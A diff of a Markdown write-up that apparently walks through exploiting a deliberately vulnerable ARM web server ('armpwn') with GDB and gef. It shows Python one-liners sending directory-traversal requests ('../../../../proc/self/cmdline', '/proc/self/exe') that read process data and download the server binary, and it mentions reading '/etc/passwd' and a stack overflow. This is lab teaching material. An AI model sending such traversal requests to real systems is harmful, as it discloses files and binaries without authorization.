@@ -64,14 +64,14 @@ Back to business: we can now read files remotely like `/etc/passwd` but we can
 also retrieve the binary using `/proc/self/exe`
 
 ```bash
-$ python -c 'import requests;print requests.get("http://rpi2-1/../../../../proc/self/cmdline").text'
+$ python -c 'import requests;print requests.get("http://"+"rpi2-1/../../../../proc/self/cmdline").text'
 HTTP/1.1 200 OK
 Content-Type: text/html
 Content-Length: 0
 
 /home/pi/armpwn/bin/websrv
 $ python -c 'import requests;print
-requests.get("http://rpi2-1/../../../../proc/self/exe").text' > websrv
+requests.get("http://"+"rpi2-1/../../../../proc/self/exe").text' > websrv
 $ file websrv
 websrv: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 2.6.26, BuildID[sha1]=5b3aa53d30579a7f7f0b9cb1eedfb06b1884e112, stripped
 ```
@@ -170,7 +170,7 @@ New connection from 192.168.69.134 on port 49539
 
 So (at least) one of the vulnerabilities is a standard stack overflow. We can
 confirm that by visualizing the execution flow with `GDB` debugger with `gef`
-extension with [`trace-run`](https://gef.readthedocs.io/en/latest/features/#trace-run-command).
+extension with [`trace-run`](https://gef.readthedocs.io/en/master/commands/trace-run/).
 
 ```bash
 gef➤  ps -sa websrv
